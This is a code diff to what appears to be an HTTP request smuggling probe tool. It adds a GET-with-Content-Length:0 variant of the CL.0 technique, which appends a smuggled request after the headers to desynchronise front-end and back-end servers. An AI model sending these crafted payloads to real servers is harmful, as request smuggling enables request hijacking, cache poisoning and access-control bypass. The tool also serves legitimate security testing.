@@ -209,8 +209,22 @@ class Technique:
             return head + body
 
         if kind == "CL.0":
-            # front honours Content-Length; back treats the request as bodyless
-            # (CL.0), so the body is reinterpreted as the next request.
+            if self.variant == "get-cl0":
+                # GET+CL:0 sub-variant: explicit Content-Length: 0 on a GET with the
+                # smuggled request appended after the headers. Targets a transparent
+                # TCP-forwarding front-end (passes all bytes) combined with a back-end
+                # that reads CL:0 as bodyless -- the extra bytes become the next
+                # back-end request prefix regardless of what CL says.
+                body = smuggled
+                head = _crlf(
+                    f"GET {path} HTTP/1.1".encode(),
+                    f"Host: {host}".encode(),
+                    b"Content-Length: 0",
+                )
+                return head + body
+            # Classic CL.0: POST with explicit Content-Length = len(smuggled).
+            # Front honours the CL and forwards the full body; back treats the
+            # request as bodyless (CL.0 bug), leaving the body as the next request.
             body = smuggled
             head = _crlf(
                 f"POST {path} HTTP/1.1".encode(),
@@ -284,6 +298,10 @@ def all_techniques() -> list[Technique]:
     techs: list[Technique] = [
         Technique("CL.TE", "CL.TE", safe_order=0),
         Technique("CL.0", "CL.0", safe_order=1),
+        # GET+CL:0 sub-variant: same discrepancy class, different probe shape.
+        # Sends GET with Content-Length: 0 and the smuggled request appended.
+        # Targets transparent TCP-forwarding front-ends + CL:0-treating back-ends.
+        Technique("CL.0", "CL.0", safe_order=1, variant="get-cl0"),
         Technique("dup-CL", "dup-CL", safe_order=2),
     ]
     # TE.TE obfuscation dictionary -- probed after CL.TE, before the raw TE.CL.
